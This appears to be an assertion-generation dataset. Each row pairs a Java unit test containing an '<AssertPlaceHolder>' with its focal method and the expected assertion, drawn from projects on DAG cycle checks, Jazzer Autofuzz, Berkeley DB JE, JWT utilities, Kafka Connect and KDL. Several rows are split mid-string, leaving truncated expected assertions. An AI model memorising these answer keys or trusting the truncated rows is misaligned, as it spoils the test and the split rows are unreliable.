hasCircle() { Set<String> allMarked = new HashSet<>(); Set<String> stackMarked = new HashSet<>(); try { for (Map.Entry<String, N> node : nodes.entrySet()) { if (allMarked.contains(node.getKey())) { continue; } markNode(allMarked, stackMarked, node.getKey()); } return false; } catch (Exception ex) { return true; } }"	assertFalse(visitor.hasCircle())
"Exception { TestAbstractDAGVisitor visitor = new TestAbstractDAGVisitor(); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""2"", ""2"")); visitor.putEdge(new TestAbstractDAGNode(""2"", ""2""), new TestAbstractDAGNode(""3"", ""3"")); visitor.putEdge(new TestAbstractDAGNode(""3"", ""3""), new TestAbstractDAGNode(""1"", ""1"")); Assert.""<AssertPlaceHolder>""; }
hasCircle() { Set<String> allMarked = new HashSet<>(); Set<String> stackMarked = new HashSet<>(); try { for (Map.Entry<String, N> node : nodes.entrySet()) { if (allMarked.contains(node.getKey())) { continue; } markNode(allMarked, stackMarked, node.getKey()); } return false; } catch (Exception ex) { return true; } }"	assertTrue(visitor.hasCircle())
"Exception { TestAbstractDAGVisitor visitor = new TestAbstractDAGVisitor(); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""2"", ""2"")); visitor.putEdge(new TestAbstractDAGNode(""2"", ""2""), new TestAbstractDAGNode(""3"", ""3"")); visitor.putEdge(new TestAbstractDAGNode(""4"", ""4""), new TestAbstractDAGNode(""5"", ""5"")); visitor.putEdge(new TestAbstractDAGNode(""5"", ""5""), new TestAbstractDAGNode(""4"", ""4"")); Assert.""<AssertPlaceHolder>""; }
hasCircle() { Set<String> allMarked = new HashSet<>(); Set<String> stackMarked = new HashSet<>(); try { for (Map.Entry<String, N> node : nodes.entrySet()) { if (allMarked.contains(node.getKey())) { continue; } markNode(allMarked, stackMarked, node.getKey()); } return false; } catch (Exception ex) { return true; } }"	assertTrue(visitor.hasCircle())
"Exception { TestAbstractDAGVisitor visitor = new TestAbstractDAGVisitor(); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""2"", ""2"")); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""3"", ""3"")); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""4"", ""4"")); visitor.putEdge(new TestAbstractDAGNode(""2"", ""2""), new TestAbstractDAGNode(""5"", ""5"")); visitor.putEdge(new TestAbstractDAGNode(""3"", ""3""), new TestAbstractDAGNode(""6"", ""6"")); visitor.putEdge(new TestAbstractDAGNode(""4"", ""4""), new TestAbstractDAGNode(""7"", ""7"")); visitor.putEdge(new TestAbstractDAGNode(""5"", ""5""), new TestAbstractDAGNode(""8"", ""8"")); visitor.putEdge(new TestAbstractDAGNode(""5"", ""5""), new TestAbstractDAGNode(""9"", ""9"")); visitor.putEdge(new TestAbstractDAGNode(""8"", ""8""), new TestAbstractDAGNode(""10"", ""10"")); visitor.putEdge(new TestAbstractDAGNode(""9"", ""9""), new TestAbstractDAGNode(""10"", ""10"")); visitor.putEdge(new TestAbstractDAGNode(""7"", ""7""), new TestAbstractDAGNode(""10"", ""10"")); visitor.putEdge(new TestAbstractDAGNode(""10"", ""10""), new TestAbstractDAGNode(""2"", ""2"")); Assert.""<AssertPlaceHolder>""; }
hasCircle() { Set<String> allMarked = new HashSet<>(); Set<String> stackMarked = new HashSet<>(); try { for (Map.Entry<String, N> node : nodes.entrySet()) { if (allMarked.contains(node.getKey())) { continue; } markNode(allMarked, stackMarked, node.getKey()); } return false; } catch (Exception ex) { return true; } }"	assertTrue(visitor.hasCircle())
"Throwable { TestAbstractDAGVisitor visitor = new TestAbstractDAGVisitor(); visitor.putNode(new TestAbstractDAGNode(""s1"", ""s1"")); visitor.putNode(new TestAbstractDAGNode(""s2"", ""s2"")); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""2"", ""2"")); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""3"", ""3"")); List chain = visitor.getChain(); Assert.""<AssertPlaceHolder>""; }
getChain() throws Throwable { if (hasCircle()) { throw new GraphCircleDetectedException(); } List chain = new ArrayList(); for (Map.Entry<String, List<N>> nextEntry : nexts.entrySet()) { List<N> children = nextEntry.getValue(); if (children == null || children.isEmpty()) { // 获得这个节点的所有前驱节点 Object visitedValue = visitNode(nextEntry.getKey()); chain.add(visitedValue); } } return chain; }"	assertEquals(4, chain.size())
"testConsume() { FuzzedDataProvider data = CannedFuzzedDataProvider.create( Arrays.asList( (byte) 1 /* do not return null */, 0 /* first class on the classpath */, (byte) 1 /* do not return null */, 0 /* first constructor */)); ImplementedInterface result = Autofuzz.consume(data, ImplementedInterface.class); ""<AssertPlaceHolder>""; }
consume(FuzzedDataProvider data, Class<T> type) { try { return (T) CONSUME.invokeExact(data, type); } catch (AutofuzzConstructionException ignored) { return null; } catch (Throwable t) { rethrowUnchecked(t); // Not reached. return null; } }"	assertNotNull(result)
"testConsumeFailsWithoutException() { FuzzedDataProvider data = CannedFuzzedDataProvider.create( Collections.singletonList( (byte) 1 /* do not return null without searching for implementing classes */)); ""<AssertPlaceHolder>""; }
consume(FuzzedDataProvider data, Class<T> type) { try { return (T) CONSUME.invokeExact(data, type); } catch (AutofuzzConstructionException ignored) { return null; } catch (Throwable t) { rethrowUnchecked(t); // Not reached. return null; } }"	assertNull(Autofuzz.consume(data, UnimplementedInterface.class))
"NoSuchMethodException { Type classArrayType = MetaTest.class.getDeclaredMethod(""returnsClassArray"").getGenericReturnType(); ""<AssertPlaceHolder>""; }
getRawType(Type genericType) { if (genericType instanceof Class<?>) { return (Class<?>) genericType; } else if (genericType instanceof ParameterizedType) { return getRawType(((ParameterizedType) genericType).getRawType()); } else if (genericType instanceof WildcardType) { // TODO: Improve this. return Object.class; } else if (genericType instanceof TypeVariable<?>) { throw new AutofuzzError(""Did not expect genericType to be a TypeVariable: "" + genericType); } else if (genericType instanceof GenericArrayType) { return Array.newInstance( getRawType(((GenericArrayType) genericType).getGenericComponentType()), 0) .getClass(); } else { throw new AutofuzzError(""Got unexpected class implementing Type: "" + genericType); } }"	assertEquals(Class[].class, Meta.getRawType(classArrayType))
"Exception { File jar = getPathToResource(""/spring-petclinic-1.5.1.jar""); Jbom jbom = new Jbom(); Libraries libs = jbom.doLocalFile( jar, ""target/test"" ); ""<AssertPlaceHolder>""; compareHashToFile(jar,libs,""petclinic""); }
getLibraries() { return new ArrayList<Component>(libraries); }"	"assertTrue( ""Incorrect number of libraries found. "" + libs.getLibraries().size() + "" instead of 135"", libs.getLibraries().size() == 135 )"
"Exception { File jar = getPathToResource(""/callback-2.18.0-SNAPSHOT.jar""); Jbom jbom = new Jbom(); Libraries libs = jbom.doLocalFile( jar, ""target/test"" ); ""<AssertPlaceHolder>""; compareHashToFile(jar,libs,""callback""); }
getLibraries() { return new ArrayList<Component>(libraries); }"	"assertTrue( ""Incorrect number of libraries found. "" + libs.getLibraries().size() + "" instead of 102"", libs.getLibraries().size() == 102 )"
"Exception { File jar = getPathToResource(""/nocomponents.jar""); Jbom jbom = new Jbom(); Libraries libs = jbom.doLocalFile( jar, ""target/test"" ); ""<AssertPlaceHolder>""; }
getLibraries() { return new ArrayList<Component>(libraries); }"	"assertTrue( ""Incorrect number of libraries found. "" + libs.getLibraries().size() + "" instead of 0"", libs.getLibraries().size() == 0 )"
"Exception { File jar = getPathToResource(""/provider-search-0.0.1-SNAPSHOT.jar""); Jbom jbom = new Jbom(); Libraries libs = jbom.doLocalFile( jar, ""target/test"" ); ""<AssertPlaceHolder>""; compareHashToFile(jar,libs,""provider-search""); }
getLibraries() { return new ArrayList<Component>(libraries); }"	"assertTrue( ""Incorrect number of libraries found. "" + libs.getLibraries().size() + "" instead of 26"", libs.getLibraries().size() == 26 )"
"Exception { File jar = getPathToResource(""/""); Jbom jbom = new Jbom(); Libraries libs = jbom.doLocalDirectory( jar.getAbsolutePath(), ""target/test"" ); ""<AssertPlaceHolder>""; }
getLibraries() { return new ArrayList<Component>(libraries); }"	"assertTrue( ""Incorrect number of libraries found. "" + libs.getLibraries().size() + "" instead of 266"", libs.getLibraries().size() == 266 )"
"testClassloaderOverride() { DatabaseEntry entry = new DatabaseEntry();  SerialBinding binding = new CustomLoaderBinding (catalog, null, new FailureClassLoader());  try { binding.objectToEntry(new MyClass(), entry); binding.entryToObject(entry); fail(); } catch (RuntimeException e) { ""<AssertPlaceHolder>""; } }
entryToObject(DatabaseEntry entry) {  int length = entry.getSize(); byte[] hdr = SerialOutput.getStreamHeader(); byte[] bufWithHeader = new byte[length + hdr.length];  System.arraycopy(hdr, 0, bufWithHeader, 0, hdr.length); System.arraycopy(entry.getData(), entry.getOffset(), bufWithHeader, hdr.length, length);  try { SerialInput jin = new SerialInput( new FastInputStream(bufWithHeader, 0, bufWithHeader.length), classCatalog, getClassLoader()); return (E) jin.readObject(); } catch (IOException e) { throw RuntimeExceptionWrapper.wrapIfNeeded(e); } catch (ClassNotFoundException e) { throw RuntimeExceptionWrapper.wrapIfNeeded(e); } }"	"assertTrue(e.getMessage().startsWith(""expect failure""))"
"testBooleanWhitespace() { String val = "" TruE ""; // has leading and trailing space String name = EnvironmentConfig.SHARED_CACHE; // any boolean will do BooleanConfigParam param = (BooleanConfigParam) EnvironmentParams.SUPPORTED_PARAMS.get(name); param.validateValue(val); EnvironmentConfig envConfig = TestUtils.initEnvConfig(); envConfig.setConfigParam(name, val); DbConfigManager configManager = new DbConfigManager(envConfig); ""<AssertPlaceHolder>""; }
getBoolean(BooleanConfigParam configParam) {  /* See if it's specified. */ String val = get(configParam); return parseBoolean(val); }"	assertEquals(true, configManager.getBoolean(param))
"testProhibitNextDeltaBug() {  open();  final IN parent = createOffHeapBIN(true /*prohibitNextDelta*/);  parent.latchNoUpdateLRU();  final INLogEntry<BIN> entry = ohCache.createBINLogEntryForCheckpoint(parent, 0);  /* This failed prior to the bug fix. */ ""<AssertPlaceHolder>"";  entry.getMainItem().releaseLatch(); parent.releaseLatch();  close(); }
createBINLogEntryForCheckpoint(final IN parent, final int index) { final int entry = parent.getOffHeapBINId(index);  if (entry < 0 || !parent.isOffHeapBINDirty(index)) { return null; }  assert parent == getOwner(entry);  final long memId = getMemId(entry);  return createBINLogEntry( memId, entry, parent, true /*preserveBINInCache*/); }"	assertFalse(entry.isBINDelta())
"testBasicFactoryDefault() {  ReplicationNetworkConfig rnc = ReplicationNetworkConfig.createDefault(); DataChannelFactory factory = DataChannelFactoryBuilder.construct(rnc); ""<AssertPlaceHolder>""; }
createDefault() {  return new ReplicationBasicConfig(); }"	assertTrue(factory instanceof SimpleChannelFactory)
"testCustomFactory() {  ReplicationBasicConfig rbc = new ReplicationBasicConfig(); final String constructParams = ""abc"";  rbc.setChannelFactoryClass(DummyFactory.class.getName()); rbc.setChannelFactoryParams(constructParams);  DataChannelFactory factory = DataChannelFactoryBuilder.construct(rbc); DummyFactory constructFactory = (DummyFactory) factory; ""<AssertPlaceHolder>""; }
setChannelFactoryParams( String factoryParams) {  setChannelFactoryParamsVoid(factoryParams); return this; }"	assertEquals(constructFactory.getParams(), constructParams)
"Exception { SubscriptionConfig config1 = new SubscriptionConfig(subNodeName, home, subHostPortPair, feederHostPortPair, groupName, groupUUID, NodeType.EXTERNAL); ""<AssertPlaceHolder>"";  /* types other than EXTERNAL and SECONDARY */ NodeType[] types = new NodeType[]{NodeType.ARBITER, NodeType.ELECTABLE, NodeType.MONITOR};  for (NodeType type : types) { try { new SubscriptionConfig(subNodeName, home, subHostPortPair, feederHostPortPair, groupName, groupUUID, type); } catch (IllegalArgumentException e) { /* expected exception due to non-supported node type */ logger.info( ""Expected IllegalArgumentException "" + e.getMessage()); } } }
getNodeType() { return nodeType; }"	assertEquals(NodeType.EXTERNAL, config1.getNodeType())
"Exception { final SubscriptionConfig config = new SubscriptionConfig(subNodeName, home, subHostPortPair, feederHostPortPair, groupName, groupUUID, NodeType.EXTERNAL);  for (EntryRequestType type : EntryRequestType.values()) { config.setStreamMode(type); ""<AssertPlaceHolder>""; } }
getStreamMode() { return streamMode; }"	assertEquals(type, config.getStreamMode())
"testGetNonexistent() { BlockBag bb; byte[] beginKey = { 0, 0, 0, 0 }; byte[] beginData = { (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff }; byte[] md5Hash = { (byte) 0xdb, (byte) 0xdb, (byte) 0xdb, (byte) 0xdb }; int numKeys = 10000; int count = 10; long rollingChksum = 7654321L;  bb = new BlockBag();  for (int i = 0; i < count; i++) { Block b = new Block(i); b.setBeginKey(beginKey); b.setBeginData(beginData); b.setMd5Hash(md5Hash); b.setNumRecords(numKeys); b.setRollingChksum(rollingChksum); bb.add(b); }  List<Block> blocks = bb.get(0L); ""<AssertPlaceHolder>""; }
get(long chksum) { List<Integer> indices; List<Block> ret;  ret = new ArrayList<Block>(); indices = chksums.get(new Long(chksum)); if (indices == null) { return null; } for (Integer indx : indices) { int i = indx.intValue(); if (i >= blockIndex) ret.add(blocks.get(i)); }  if (ret.size() == 0) { return null; } return ret; }"	assertTrue(blocks == null)
"testRandomAdler32SingleBytes() { Checksum javaChecksum = new java.util.zip.Adler32(); Checksum jeChecksum = new com.sleepycat.je.utilint.Adler32(); Random rnd = new Random(); for (int i = 0; i < N_ITERS; i++) { int nBytes = rnd.nextInt(65535); javaChecksum.reset(); jeChecksum.reset(); for (int j = 0; j < nBytes; j++) { byte b = (byte) (rnd.nextInt(256) & 0xff); javaChecksum.update(b); jeChecksum.update(b); } ""<AssertPlaceHolder>""; } }
getValue() { return adler; }"	assertEquals(javaChecksum.getValue(), jeChecksum.getValue())
"testDbLsn() { for (int i = 0; i < values.length; i++) { long value = values[i]; long lsn = DbLsn.makeLsn(value, value); ""<AssertPlaceHolder>""; } }
getFileOffset(long lsn) { return (lsn & INT_MASK); }"	assertTrue((DbLsn.getFileNumber(lsn) == value) && (DbLsn.getFileOffset(lsn) == value))
"Exception { final String TESTFILE = ""test.csv""; final String data[] = {""col1,col2,col3,col4,col5"", "" ""double quotestring"", escape\\,delimiter, ,,""}; File envHome = SharedTestUtils.getTestDir(); File tmpfile = new File(envHome, TESTFILE); if (tmpfile.exists()) { tmpfile.delete(); }  BufferedWriter out = new BufferedWriter(new FileWriter(tmpfile, true)); for (int i = 0; i < data.length; i++) { out.write(data[i]); out.newLine(); } out.flush(); out.close(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); String[] args = new String[] { ""-p"", data[0], tmpfile.getAbsolutePath() };  PrintStream original = System.out; try { System.setOut(new PrintStream(baos)); if (!(new DbFilterStats()).execute(args)) { fail(""command did not return expected value""); } baos.flush(); } finally { System.setOut(original); } String filOut = baos.toString(); BufferedReader br = new BufferedReader(new StringReader(filOut)); int rowcount = 0; String row; while((row = br.readLine()) != null) { ""<AssertPlaceHolder>""; rowcount++; } }
execute(String argv[]) { boolean retcode = true;  if (argv.length == 0) { System.err.println(USAGE); return retcode; }  try { DbFilterStats dbf = new DbFilterStats(); dbf.parseArgs(argv); dbf.validateParams(); dbf.processFiles(); } catch (IllegalArgumentException e) { retcode = false; } return retcode; }"	"assertEquals(""row not expected"", data[rowcount], row)"
"testConstructor() { AtomicLongComponent comp = new AtomicLongComponent(); ""<AssertPlaceHolder>""; }
get() { return val.get(); }"	assertEquals(Long.valueOf(0), comp.get())
"testSet() { AtomicLongComponent comp = new AtomicLongComponent(); comp.set(72); ""<AssertPlaceHolder>""; }
get() { return val.get(); }"	assertEquals(Long.valueOf(72), comp.get())
"testClear() { AtomicLongComponent comp = new AtomicLongComponent(); comp.set(37); comp.clear(); ""<AssertPlaceHolder>""; }
get() { return val.get(); }"	assertEquals(Long.valueOf(0), comp.get())
"testToString() { AtomicLongComponent comp = new AtomicLongComponent(); comp.set(987654321); ""<AssertPlaceHolder>""; }
toString() { return val.toString(); }"	"assertEquals(""987654321"", comp.toString())"
"testCreateStat() { AtomicLongComponent compA = map.createStat(""a""); compA.set(1); AtomicLongComponent compB = map.createStat(""b""); compB.set(2); ""<AssertPlaceHolder>"";b=2"", map.get()); }
createStat(String key) { assert key != null; final AtomicLongComponent stat = new AtomicLongComponent(); statMap.put(key, stat); return stat; }"	"assertEquals(""a=1"
"testCreateStat() { LongAvgRate compA = map.createStat(""a""); compA.add(0, 1000); compA.add(1000, 2000); LongAvgRate compB = map.createStat(""b""); compB.add(0, 1000); compB.add(2000, 2000); ""<AssertPlaceHolder>"";b=2"", map.get()); }
createStat(String key) { assert key != null; final LongAvgRate stat = new LongAvgRate( definition.getName() + "":"" + key, periodMillis, reportTimeUnit); statMap.put(key, stat); return stat; }"	"assertEquals(""a=1"
"Exception { ObjectName objectName = mock(ObjectName.class); MBeanServerConnection mBeanServerConnection = mockMbeanServer(objectName, ""unlocked""); when(mBeanServerConnection.invoke(any(ObjectName.class), anyString(), any(Object[].class), any(String[].class))).thenReturn(""Started recording 99. ""); FlightRecorderDiagnosticCommandConnection connection = new FlightRecorderDiagnosticCommandConnection(mBeanServerConnection, objectName); long id = connection.startRecording(new RecordingOptions.Builder().build(), RecordingConfiguration.PROFILE_CONFIGURATION); Assert.""<AssertPlaceHolder>""; }
startRecording(RecordingOptions recordingOptions, RecordingConfiguration recordingConfiguration) throws JfrStreamingException {  if(recordingConfiguration instanceof RecordingConfiguration.MapConfiguration) { throw new JfrStreamingException(""Map configuration not available for "" + FlightRecorderDiagnosticCommandConnection.class.getSimpleName() + "".""); }  Object[] params = formOptions(recordingOptions, recordingConfiguration);  // jfrStart returns ""Started recording 2."" and some more stuff, but all we care about is the name of the recording. try { String jfrStart = (String) mBeanServerConnection.invoke(objectName, ""jfrStart"", params, signature); String name; Matcher matcher = JFR_START_PATTERN.matcher(jfrStart); if (matcher.find()) { name = matcher.group(1); return Long.parseLong(name); } } catch (InstanceNotFoundException | IOException | ReflectionException | MBeanException e) { throw new JfrStreamingException(""Failed to start recording"", e); } throw new JfrStreamingException(""Failed to start recording""); }"	assertEquals(id, 99)
"Exception { when(clockMock.now()).thenReturn(DateUtil.now());  final String token = createToken();  ""<AssertPlaceHolder>""; }
getUsernameFromToken(String token) { return getClaimFromToken(token, Claims::getSubject); }"	assertThat(jwtTokenUtil.getUsernameFromToken(token)).isEqualTo(TEST_USERNAME)
"Exception { final Date now = DateUtil.now(); when(clockMock.now()).thenReturn(now);  final String token = createToken();  ""<AssertPlaceHolder>""; }
getIssuedAtDateFromToken(String token) { return getClaimFromToken(token, Claims::getIssuedAt); }"	assertThat(jwtTokenUtil.getIssuedAtDateFromToken(token)).isInSameMinuteWindowAs(now)
"Exception { final Date now = DateUtil.now(); when(clockMock.now()).thenReturn(now); final String token = createToken();  final Date expirationDateFromToken = jwtTokenUtil.getExpirationDateFromToken(token); ""<AssertPlaceHolder>""; }
getExpirationDateFromToken(String token) { return getClaimFromToken(token, Claims::getExpiration); }"	assertThat(DateUtil.timeDifference(expirationDateFromToken, now)).isCloseTo(3600000L, within(1000L))
"Exception { when(clockMock.now()) .thenReturn(DateUtil.now()); String token = createToken(); ""<AssertPlaceHolder>""; }
canTokenBeRefreshed(String token, Date lastPasswordReset) { final Date created = getIssuedAtDateFromToken(token); return !isCreatedBeforeLastPasswordReset(created, lastPasswordReset) && (!isTokenExpired(token) || ignoreTokenExpiration(token)); }"	assertThat(jwtTokenUtil.canTokenBeRefreshed(token, DateUtil.tomorrow())).isFalse()
"notExpiredCanBeRefreshed() { when(clockMock.now()) .thenReturn(DateUtil.now()); String token = createToken(); ""<AssertPlaceHolder>""; }
canTokenBeRefreshed(String token, Date lastPasswordReset) { final Date created = getIssuedAtDateFromToken(token); return !isCreatedBeforeLastPasswordReset(created, lastPasswordReset) && (!isTokenExpired(token) || ignoreTokenExpiration(token)); }"	assertThat(jwtTokenUtil.canTokenBeRefreshed(token, DateUtil.yesterday())).isTrue()
"Exception { when(clockMock.now()) .thenReturn(DateUtil.now()) .thenReturn(DateUtil.tomorrow()); String firstToken = createToken(); String refreshedToken = jwtTokenUtil.refreshToken(firstToken); Date firstTokenDate = jwtTokenUtil.getIssuedAtDateFromToken(firstToken); Date refreshedTokenDate = jwtTokenUtil.getIssuedAtDateFromToken(refreshedToken); ""<AssertPlaceHolder>""; }
getIssuedAtDateFromToken(String token) { return getClaimFromToken(token, Claims::getIssuedAt); }"	assertThat(firstTokenDate).isBefore(refreshedTokenDate)
"Exception { when(clockMock.now()) .thenReturn(DateUtil.now()); UserDetails userDetails = mock(JwtUser.class); when(userDetails.getUsername()).thenReturn(TEST_USERNAME);  String token = createToken(); ""<AssertPlaceHolder>""; }
validateToken(String token, UserDetails userDetails) { JwtUser user = (JwtUser) userDetails; final String username = getUsernameFromToken(token); final Date created = getIssuedAtDateFromToken(token); //final Date expiration = getExpirationDateFromToken(token); return ( username.equals(user.getUsername()) && !isTokenExpired(token) && !isCreatedBeforeLastPasswordReset(created, user.getLastPasswordResetDate()) ); }"	assertThat(jwtTokenUtil.validateToken(token, userDetails)).isTrue()
"transformRecordValue2JsonStringLogicalTypesDatetimeAsWRONGVLAUETest() { final Map<String, Object> props = new HashMap<>();  props.put(""json.string.field.name"", ""myawesomejsonstringfield""); props.put(""json.writer.handle.logical.types"", true); props.put(""json.writer.datetime.logical.types.as"", ""wrong value"");  try { valueSmt.configure(props); fail(""Expected an IllegalArgumentException""); } catch (IllegalArgumentException ex) { ""<AssertPlaceHolder>""; } }
configure(Map<String, ?> props) { final SimpleConfig config = new SimpleConfig(CONFIG_DEF, props); jsonStringFieldName = config.getString(ConfigName.JSON_STRING_FIELD_NAME); jsonStringOutputSchema = makeJsonStringOutputSchema(); handleLogicalTypes = config.getBoolean(ConfigName.JSON_WRITER_HANDLE_LOGICAL_TYPES); writeDatetimeLogicalTypesAs = config.getString(ConfigName.JSON_WRITER_DATETIME_LOGICAL_TYPES_AS); writeDatetimeWithPattern = config.getString(ConfigName.JSON_WRITER_DATETIME_PATTERN); writeDatetimeWithZoneId = config.getString(ConfigName.JSON_WRITER_DATETIME_ZONE_ID);  if (handleLogicalTypes) { Converter<Long> dateTimeConverter = null; if (writeDatetimeLogicalTypesAs.equalsIgnoreCase(""STRING"")) { dateTimeConverter = new JsonDateTimeAsStringConverter(writeDatetimeWithPattern, writeDatetimeWithZoneId); } else if (writeDatetimeLogicalTypesAs.equalsIgnoreCase(""LONG"")) { dateTimeConverter = new JsonDateTimeAsLongConverter(); } else { throw new IllegalArgumentException(""Wrong value for configuration setting: "" + ConfigName.JSON_WRITER_DATETIME_LOGICAL_TYPES_AS + ""="" + writeDatetimeLogicalTypesAs); }  jsonWriterSettings = JsonWriterSettings .builder() .outputMode(toJsonMode(config.getString(ConfigName.JSON_WRITER_OUTPUT_MODE))) .dateTimeConverter(dateTimeConverter) .decimal128Converter(new JsonDecimalConverter()) .binaryConverter(new JsonBinaryConverter()) .build(); } else { jsonWriterSettings = JsonWriterSettings .builder() .outputMode(toJsonMode(config.getString(ConfigName.JSON_WRITER_OUTPUT_MODE))) .build(); }  converter = new AvroJsonSchemafulRecordConverter(); converterWithoutSchema = new JsonSchemalessRecordConverter();  transformToXML = config.getBoolean(ConfigName.POST_PROCESSING_TO_XML); }"	"assertEquals(""Wrong value for configuration setting: json.writer.datetime.logical.types.as=wrong value"", ex.getMessage())"
"testMutateEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build();  ""<AssertPlaceHolder>""; verifyNoInteractions(mutation); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	assertThat(search.mutate(inputDoc, mutation), equalTo(inputDoc))
"testMutateEmptyWithPredicate() { final KDLDocument inputDoc = KDLDocument.empty(); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build();  ""<AssertPlaceHolder>""; verifyNoInteractions(mutation); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	assertThat(search.mutate(inputDoc, mutation), equalTo(inputDoc))
"testMutateNothingMatchesPredicate() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4;}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verifyNoInteractions(mutation); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	assertThat(search.mutate(inputDoc, mutation), equalTo(inputDoc))
"testMutateRootNodeMatchesPredicateDelete() { final KDLDocument inputDoc = parser.parse(""node1; node2; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true); when(mutation.apply(any())).thenReturn(Optional.empty());  ""<AssertPlaceHolder>""; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node2""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateBranchNodeMatchesPredicateDelete() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4 {node5;};}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenReturn(Optional.empty());  ""<AssertPlaceHolder>""; node2; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateLeafNodeMatchesPredicateDelete() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4;}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenReturn(Optional.empty());  ""<AssertPlaceHolder>""; node2; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateEverythingMatchesPredicate() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4 {node5;};}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 1 {node4 1 {node5 1;};}; node3 1""))); verify(mutation, times(5)).apply(any()); verifyNoMoreInteractions(mutation); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1 1"
"testMutateRootNodeMatchesPredicate() { final KDLDocument inputDoc = parser.parse(""node1; node2; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 1; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node2""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateBranchNodeMatchesPredicate() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4 {node5;};}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node4 1 {node5;};}; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateLeafNodeMatchesPredicate() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4;}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node4 1;}; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
